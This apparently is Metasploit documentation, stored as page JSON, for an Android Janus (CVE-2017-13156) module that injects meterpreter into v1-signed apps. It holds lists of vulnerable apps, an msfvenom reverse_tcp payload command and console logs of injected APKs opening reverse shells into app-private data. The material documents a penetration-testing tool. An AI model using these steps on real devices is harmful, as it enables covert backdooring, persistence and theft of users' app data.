{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/android/local/janus","result":{"data":{"moduleMetadataJson":{"id":"f26d33b7-3881-5ec5-9229-46a02929867e","name":"Android Janus APK Signature bypass","fullname":"exploit/android/local/janus","description":"This module exploits CVE-2017-13156 in Android to install a payload into another\n        application. The payload APK will have the same signature and can be installed\n        as an update, preserving the existing data.\n        The vulnerability was fixed in the 5th December 2017 security patch, and was\n        additionally fixed by the APK Signature scheme v2, so only APKs signed with\n        the v1 scheme are vulnerable.\n        Payload handler is disabled, and a multi/handler must be started first.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/android/local/janus","documentationSlug":"/modules/documentation/exploit/android/local/janus"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits CVE-2017-13156 in Android to install a payload into another\napplication. The payload APK will have the same signature and can be installed\nas an update, preserving the existing data.\nThe vulnerability was fixed in the 5th December 2017 security patch, and was\nadditionally fixed by the APK Signature scheme v2, so only APKs signed with\nthe v1 scheme are vulnerable.</p>\n<p>This module will potentially give two things, the first is access to the private\ndate for the app which was injected in to.  The second is a more stealthy persistence\nmechanism since the payload will start each time the injected app starts.</p>\n<p>Some devices when installing the updated apk file give an error \"There was a problem parsing the package.\"</p>\n<h2 id=\"confirmed-vulnerable-apps\" style=\"position:relative;\"><a href=\"#confirmed-vulnerable-apps\" aria-label=\"confirmed vulnerable apps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Confirmed Vulnerable Apps</h2>\n<p>The following table shows known vulnerable apps either pre-installed on a phone or available to download.</p>\n<table>\n<thead>\n<tr>\n<th>Package</th>\n<th>Version</th>\n<th>From Phone</th>\n<th>MD5</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>com.google.android.googlequicksearchbox</td>\n<td></td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>854378571509c9aa7a49f84d3f2c11c8</td>\n</tr>\n<tr>\n<td>com.ume.browser.northamerica (Browser)</td>\n<td>v3.42.21161215</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>726a13647fb6afb9c147b540641eb82a</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/heavysixer/phonegap-camera-sample/blob/master/bin/CameraSample.apk\">com.phonegap.camerasample</a></td>\n<td>1.0</td>\n<td></td>\n<td>00411ebec8e7ab3fc0292070cba5efbd</td>\n</tr>\n<tr>\n<td>com.android.vending (Google play store)</td>\n<td>6.9.21.G-all [0] 3270725</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>bed81c338f61c6095265592ee6fbb6d8</td>\n</tr>\n<tr>\n<td>com.apptap.appfinder.tracfone</td>\n<td>1.7.5.0</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>c20da001a44cd30cc09c1460ca84f743</td>\n</tr>\n<tr>\n<td>com.tracfone.generic.downloaderapp</td>\n<td>R3.1.2</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>448d39f6e5b2370d5b14f24c0d2dd79b</td>\n</tr>\n<tr>\n<td>com.google.android.tts (must enable TalkBack feature)</td>\n<td>3.10.10</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>c44485e17a9a5987e9e3d09507b2bfda</td>\n</tr>\n<tr>\n<td>com.google.android.videos</td>\n<td>3.19.11</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>e95baeda7fabc3173289be7274fa350f</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"hostile-apps\" style=\"position:relative;\"><a href=\"#hostile-apps\" aria-label=\"hostile apps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Hostile Apps</h2>\n<p>This table shows apps which seemed to work (injected, installed without error) but had adverse effects.  These apps\nshould typically be avoided unless tested.</p>\n<table>\n<thead>\n<tr>\n<th>Package</th>\n<th>Version</th>\n<th>From Phone</th>\n<th>MD5</th>\n<th>Issue</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>com.google.android.youtube</td>\n<td>11.38.54</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>8152ea89b99da5fe66880607a8f93d96</td>\n<td>App crash on start</td>\n</tr>\n<tr>\n<td>com.android.launcher3</td>\n<td></td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>45139b7bf9cc328dcd1f0a3f01f87eb6</td>\n<td>Seems to be the GUI for the phone.  When GUI restarted, no session.</td>\n</tr>\n<tr>\n<td>com.instagram.android</td>\n<td>stub</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>6e8543dec479508f4952ece014218597</td>\n<td>No session</td>\n</tr>\n<tr>\n<td>com.google.android.music</td>\n<td>6.14.3420-0.G.3279860</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>09a49fea442c88b23a8f3752caff33de</td>\n<td>App crash on start</td>\n</tr>\n<tr>\n<td>com.google.android.apps.docs</td>\n<td></td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>b0e96f36b7bdfa7ca3064c71538c1339</td>\n<td>App loop, no start</td>\n</tr>\n<tr>\n<td>com.google.android.apps.maps</td>\n<td>9.38.1</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>91d0f8f24ce451deb31cf9f4b9a1d3c6</td>\n<td>App crash on start</td>\n</tr>\n<tr>\n<td>com.android.chrome</td>\n<td>53.0.2785.124</td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>ac6bbbd5ea559dbb63c42eb7e863286b</td>\n<td>Original session dies on upload</td>\n</tr>\n<tr>\n<td>com.google.android.gms</td>\n<td></td>\n<td>Stock ZTE Z798BL Android 6.0.1 tracphone</td>\n<td>504de5427ec47fa3e124c7b5e3413c50</td>\n<td>Original session dies on upload</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module will only work on applications that are signed with only the v1 signature scheme. You can verify which signing scheme an APK is signed with using the <code class=\"language-text\">apksigner</code> tool in the Android SDK:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ apksigner verify -verbose notvulnerable.apk\nVerifies\nVerified using v1 scheme (JAR signing): true\nVerified using v2 scheme (APK Signature Scheme v2): true\nNumber of signers: 1\n\n$ apksigner verify -verbose vulnerableapplication.apk\nVerifies\nVerified using v1 scheme (JAR signing): true\nVerified using v2 scheme (APK Signature Scheme v2): false\nNumber of signers: 1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Start a handler with <code class=\"language-text\">exploit/multi/handlers</code></li>\n<li>Do: <code class=\"language-text\">use exploit/android/local/janus</code></li>\n<li>Do: <code class=\"language-text\">set session [session]</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>On the phone, a new screen will ask about installing the updated app, say yes/ok, then open the app.</li>\n<li>You should get a new session.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>PACKAGE</strong></p>\n<p>  Select a package to infect.  A list of packages can be obtained by running <code class=\"language-text\">app_list</code> on meterpreter.  Using <code class=\"language-text\">ALL</code> will\nloop through all packages and attempt to exploit them until successful.  This can take a while, and cause lots of data to be\ntransferred.  Default is <code class=\"language-text\">com.phonegap.camerasample</code></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"comphonegapcamerasample-on-nexus-6p-with-november-2016-security-patch\" style=\"position:relative;\"><a href=\"#comphonegapcamerasample-on-nexus-6p-with-november-2016-security-patch\" aria-label=\"comphonegapcamerasample on nexus 6p with november 2016 security patch permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>com.phonegap.camerasample on Nexus 6p with November 2016 Security Patch</h3>\n<p>Install <a href=\"https://github.com/heavysixer/phonegap-camera-sample/blob/master/bin/CameraSample.apk\">com.phonegap.camerasample</a></p>\n<p>An <code class=\"language-text\">exploit/multi/handler</code> was started prior to exploitation.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                        Information         Connection\n  --  ----  ----                        -----------         ----------\n  1         meterpreter dalvik/android  u0_a80 @ localhost  192.168.0.176:4444 -&gt; 192.168.0.107:46059 (192.168.0.107)\n\nmsf5 exploit(multi/handler) &gt; use exploit/android/local/janus\nmsf5 exploit(android/local/janus) &gt; set PACKAGE com.phonegap.camerasample\nPACKAGE =&gt; com.phonegap.camerasample\nmsf5 exploit(android/local/janus) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf5 exploit(android/local/janus) &gt; set LHOST 192.168.0.176\nLHOST =&gt; 192.168.0.176\nmsf5 exploit(android/local/janus) &gt; set LPORT 4445\nLPORT =&gt; 4445\nmsf5 exploit(android/local/janus) &gt; run\n\n[*] Downloading APK: /data/app/com.phonegap.camerasample-1/base.apk\n[*] Decompiling original APK..\n[*] Decompiling payload APK..\n[*] Locating hook point..\n[*] Adding payload as package com.phonegap.camerasample.syerq\n[*] Loading /tmp/d20190824-7164-qydvgj/original/smali/com/phonegap/camerasample/CameraSampleActivity.smali and injecting payload..\n[*] Rebuilding apk with meterpreter injection as /tmp/d20190824-7164-qydvgj/output.apk\n[*] Uploading APK: /sdcard/app.apk\n[*] APK uploaded\nmsf5 exploit(android/local/janus) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Please note that the user will need to manually accept the install prompt on the device (and also open the application) before a new session is opened.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Sending stage (72609 bytes) to 192.168.0.107\n[*] Meterpreter session 2 opened (192.168.0.176:4445 -&gt; 192.168.0.107:49710) at 2018-10-01 17:44:50 +0800\n\nmsf5 exploit(android/local/janus) &gt; sessions 2\n[*] Starting interaction with 2...\n\nmeterpreter &gt; pwd\n/data/user/0/com.phonegap.camerasample/files</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"browser-comumebrowsernorthamerica-on-zte-z798bl-android-601-with-december-2016-security-patch\" style=\"position:relative;\"><a href=\"#browser-comumebrowsernorthamerica-on-zte-z798bl-android-601-with-december-2016-security-patch\" aria-label=\"browser comumebrowsernorthamerica on zte z798bl android 601 with december 2016 security patch permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Browser (com.ume.browser.northamerica) on ZTE Z798BL Android 6.0.1 with December 2016 Security Patch</h3>\n<p>Original payload was generated as such:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p android/meterpreter_reverse_tcp LHOST=1.1.1.1 LPORT=9999 -o /var/www/html/android.apk</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (janus.rb)&gt; use exploit/multi/handler\nresource (janus.rb)&gt; set payload android/meterpreter_reverse_tcp\npayload =&gt; android/meterpreter_reverse_tcp\nresource (janus.rb)&gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (janus.rb)&gt; set lport 9999\nlport =&gt; 9999\nresource (janus.rb)&gt; run\n[*] Started reverse TCP handler on 1.1.1.1:9999 \n[*] Meterpreter session 1 opened (1.1.1.1:9999 -&gt; 2.2.2.2:43753) at 2019-11-05 20:08:53 -0500\nWARNING: Local file /root/metasploit-framework/data/meterpreter/ext_server_stdapi.jar is being used\n\nmeterpreter &gt; getuid\nServer username: u0_a89\nmeterpreter &gt; pwd\n/data/user/0/com.metasploit.stage/files\nmeterpreter &gt; sysinfo\nComputer    : localhost\nOS          : Android 6.0.1 - Linux 3.10.49-gc5a5f6b-00560-gb1fe534 (armv7l)\nMeterpreter : dalvik/android\nmeterpreter &gt; background\n[*] Backgrounding session 1...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Start the payload handler to catch the new callback</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (janus.rb)&gt; set payload android/meterpreter/reverse_tcp\npayload =&gt; android/meterpreter/reverse_tcp\nresource (janus.rb)&gt; set lport 4444\nlport =&gt; 4444\nresource (janus.rb)&gt; run -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Exploit</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (janus.rb)&gt; use janus\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n\nMatching Modules\n================\n\n   #  Name                         Disclosure Date  Rank    Check  Description\n   -  ----                         ---------------  ----    -----  -----------\n   0  exploit/android/local/janus  2017-07-31       manual  Yes    Android Janus APK Signature bypass\n\n\n[*] Using exploit/android/local/janus\nresource (janus.rb)&gt; set session 1\nsession =&gt; 1\nresource (janus.rb)&gt; set package com.ume.browser.northamerica\npackage =&gt; com.ume.browser.northamerica\nresource (janus.rb)&gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (janus.rb)&gt; set lport 4444\nlport =&gt; 4444\nresource (janus.rb)&gt; set verbose true\nverbose =&gt; true\nresource (janus.rb)&gt; run\n[+] Android version 6.0.1 appears to be vulnerable.\n[+] Android security patch level 2016-12-01 is vulnerable\n[*] Downloading APK: /system/priv-app/UmeBrowser/UmeBrowser.apk\n[*] Decompiling original APK..\n[*] Decompiling payload APK..\n[*] Locating hook point..\n[*] Adding payload as package com.ume.browser.northamerica.onhad\n[*] Loading /tmp/d20191105-15343-1heobn1/original/smali/com/ume/browser/UmeApplication.smali and injecting payload..\n[*] Rebuilding apk with meterpreter injection as /tmp/d20191105-15343-1heobn1/output.apk\n[*] Uploading APK: /sdcard/app.apk\n[*] APK uploaded\n[*] User should now have a prompt to install an updated version of the app\nmsf5 exploit(android/local/janus) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Install the app on the phone.  For this app, clicking Open was not required, the shell was immediate.</p>\n<p><img src=\"https://user-images.githubusercontent.com/752491/68260086-d404a000-0009-11ea-96bc-aa3700570326.png\" alt=\"phone 1\">\n<img src=\"https://user-images.githubusercontent.com/752491/68260085-d404a000-0009-11ea-9a10-b4da9c322996.png\" alt=\"phone 2\">\n<img src=\"https://user-images.githubusercontent.com/752491/68260084-d404a000-0009-11ea-8256-92803b5d2ec8.png\" alt=\"phone 3\"></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">WARNING: Local file /root/metasploit-framework/data/android/metstage.jar is being used\nWARNING: Local file /root/metasploit-framework/data/android/meterpreter.jar is being used\n\n[*] Sending stage (73445 bytes) to 2.2.2.2\n[*] Meterpreter session 2 opened (1.1.1.1:4444 -&gt; 2.2.2.2:38676) at 2019-11-05 20:12:38 -0500\n\n[-] Unknown command: (installing.\nmsf5 exploit(android/local/janus) &gt; sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter &gt; getuid\nServer username: u0_a34\nmeterpreter &gt; pwd\n/data/user/0/com.ume.browser.northamerica/files</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f26d33b7-3881-5ec5-9229-46a02929867e"}}}